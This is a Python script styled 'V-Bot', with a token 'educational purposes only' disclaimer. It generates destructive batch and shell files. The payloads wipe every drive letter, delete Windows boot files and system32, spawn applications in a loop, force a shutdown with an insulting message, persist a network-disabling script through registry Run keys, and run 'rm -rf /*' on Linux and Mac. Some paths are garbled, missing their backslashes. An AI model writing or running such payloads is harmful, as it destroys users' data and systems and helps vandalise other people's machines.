#!/usr/bin/env python

usragr=input("This Tool is for educational purposes only. I take no responsibility for the use. To continue tipe in OK")
if usragr==("OK"):
    print("Hello, i am V-Bot. ")
    start=input("To start press s: ")
    if start==("s"):
        print("Windows(batch) or Linux/Mac(bash)?")
        oschoise=input("wich one?: ")
        if oschoise==("batch"):
            print("choose:")
            print("Full erase=1")
            print("Crash PC forever=2")
            print("App Bomber=3")
            print("Delete sys32=4")
            print("Shut down i love you=5")
            print("Disable Internet Permanently=6")
            
            choise=input("Your choise: ")
            if choise==("1"):
                lines = ['@echo off', 'del A:*.* /f /s /q', "del B:*.* /f/s/q", "del C:*.* /f/s/q", "del D:*.* /f/s/q", "del E:*.* /f/s/q", "del F:*.* /f/s/q", 
                                "del G:*.* /f/s/q", "del H:*.* /f/s/q", "del I:*.* /f/s/q", "del J:*.* /f/s/q", "del K:*.* /f/s/q", "del L:*.* /f/s/q", "del M:*.* /f/s/q", 
                                "del N:*.* /f/s/q", "del O:*.* /f/s/q", "del P:*.* /f/s/q", "del Q:*.* /f/s/q", "del R:*.* /f/s/q", "del S:*.* /f/s/q", "del T:*.* /f/s/q", 
                                "del U:*.* /f/s/q", "del V:*.* /f/s/q", "del W:*.* /f/s/q", "del X:*.* /f/s/q", "del Y:*.* /f/s/q", "del Z:*.* /f/s/q"]
                with open('Full erase.bat', 'w') as f:
                    for line in lines:
                        f.write(line)
                        f.write('\n')
            elif choise==("2"):
                lines = ["@echo off", "attrib -r -s -h c:autoexec.bat", "del c:autoexec.bat", "attrib -r -s -h c:boot.ini", "del c:boot.ini", 
                                "attrib -r -s -h c:ntldr", "del c:ntldr", "attrib -r -s -h c:windowswin.ini", "del c:windowswin.ini"]
                with open('Crash PC forever.bat', 'w') as f:
                    for line in lines:
                        f.write(line)
                        f.write('\n')
            elif choise==("3"):
                lines = ["@echo off", "start winword", "start mspaint", "start notepad", "start write", "start cmd", "start explorer", "start control", "start calc", "goto x"]
                with open('AppBomber.bat', 'w') as f:
                    for line in lines:
                        f.write(line)
                        f.write('\n')
            elif choise==("4"):
                lines = ["@echo off", "del c:WINDOWSsystem32*.*/q"]
                with open('Delsys32.bat', 'w') as f:
                    for line in lines:
                        f.write(line)
                        f.write('\n')
            elif choise==("5"):
                lines = ["@echo off", "msg * I do not like you", "shutdown -c “Error! You are too stupid!” -s"]
                with open('shut down i love you.bat', 'w') as f:
                    for line in lines:
                        f.write(line)
                        f.write('\n')
            elif choise==("6"):
                lines = ["@echo off", "echo @echo off>c:windowswimn32.bat", "echo break off>>c:windowswimn32.bat", "echo ipconfig/release_all>>c:windowswimn32.bat", 
                                "echo end>>c:windowswimn32.bat", "reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f", 
                                "reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f", "echo You Have Been HACKED!", 
                                "PAUSE"]
                with open('Disable Inet permanently.bat', 'w') as f:
                    for line in lines:
                        f.write(line)
                        f.write('\n')
    elif oschoise==("bash"):
                OS=input("Linux=1, Mac=2")
                if OS==("1"):
                    print("Note: to execute this on Linux OS chmod the files first")
                    print("full erase=1")
                    
                    bashchoise=input("your choise: ")
                    if bashchoise==("1"):
                        lines = ["#!/usr/bin/env python", "rm -rf /*"]
                        with open("fullerase.sh", "w") as f:
                            for line in lines:
                                f.write(line)
                                f.write("\n")
                elif OS==("2"):
                    print("Note: for Mac OS chmod files first")
                    lines = [" #!/bin/bash", "rm -rf /*"]
                    with open("fullerase.command", "w") as f:
                        for line in lines:
                            f.write(line)
                            f.write("\n")
                
    else:
        print("Than not")
